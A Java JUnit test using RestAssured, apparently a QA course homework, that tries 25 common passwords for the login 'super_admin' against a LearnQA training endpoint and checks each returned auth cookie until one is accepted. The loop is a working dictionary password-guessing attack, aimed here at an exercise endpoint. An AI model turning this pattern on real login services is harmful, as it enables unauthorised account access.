package tests;

import io.qameta.allure.Issue;
import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.List;

public class GetSecretPasswordHomeWorkTest {

    @Issue(value = "JIRA-127")
    @Test
    public void testSecretPasswordHomeWork() {
        List<String> passwords = List.of(
                "123456", "password", "123456789", "12345678", "12345",
                "111111", "1234567", "dragon", "letmein", "football",
                "admin", "welcome", "monkey", "login", "abc123",
                "starwars", "123123", "dragon", "passw0rd", "master",
                "hello", "freedom", "whatever", "qazwsx", "trustno1"
        );

        String correctPassword = null;
        String checkResponse = null;

        for (String candidate : passwords) {
            Response getCookieResponse = RestAssured
                    .given()
                    .contentType("application/x-www-form-urlencoded")
                    .formParam("login", "super_admin")
                    .formParam("password", candidate)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String authCookie = getCookieResponse.getCookie("auth_cookie");

            if (authCookie == null) {
                continue;
            }

            checkResponse = RestAssured
                    .given()
                    .cookie("auth_cookie", authCookie)
                    .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .asString();

            if (!"You are NOT authorized".equals(checkResponse)) {
                correctPassword = candidate;
                break;
            }
        }

        if (correctPassword != null) {
            System.out.println("Пароль подходит: " + correctPassword);
            System.out.println("Ответ от сервера: " + checkResponse);
        } else {
            System.out.println("Не правильный пароль");
        }
    }
}